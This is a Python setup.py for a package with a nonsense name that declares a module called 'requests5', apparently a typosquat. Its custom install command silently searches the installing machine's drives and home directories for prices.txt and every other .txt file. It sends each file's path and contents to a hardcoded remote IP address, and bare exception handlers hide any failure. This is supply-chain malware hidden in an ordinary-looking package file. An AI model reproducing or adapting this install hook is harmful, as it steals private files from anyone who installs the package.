from setuptools import setup

from setuptools.command.develop import develop
from setuptools.command.install import install

import os, glob


import urllib.request
import json

def post_json(body):
    myurl = "http://140.238.202.225:8080"

    req = urllib.request.Request(myurl)
    req.add_header('Content-Type', 'application/json; charset=utf-8')
    jsondata = json.dumps(body)
    jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
    req.add_header('Content-Length', len(jsondataasbytes))
    response = urllib.request.urlopen(req, jsondataasbytes)


class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # post_fields = {'out': 'bar'}     # Set POST fields here

        try:
            path = '/home'
            for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass

        try:
            path = '/'
            for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass

        try:
            with open( '\\prices.txt', 'r') as f: # open in readonly mode
                 # do your stuff
                text = f.read() + '\n'
                post_json({filename: text})
        except:
            pass

        try:
            path = 'C:\\'
            for filename in glob.glob(os.path.join(path, '**\\prices.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass

        try:
            path = 'D:\\'
            for filename in glob.glob(os.path.join(path, '**\\prices.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass

        try:
            path = 'C:\\'
            for filename in glob.glob(os.path.join(path, '**\\*.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass

        try:
            path = ''
            for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass

        try:
            path = ''
            for filename in glob.glob(os.path.join(path, '**/*.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass
        
        try:
            path = '/'
            for filename in glob.glob(os.path.join(path, '**/*.txt'),  recursive=True):
                try:
                    with open( filename, 'r') as f: # open in readonly mode
                        # do your stuff
                        text = f.read() + '\n'
                        post_json({filename: text})
                except:
                    pass
        except:
            pass
            


setup(
    name='fasdghjkhjafsd',
    version='0.0.3',
    py_modules=['requests5'],
     cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    }
)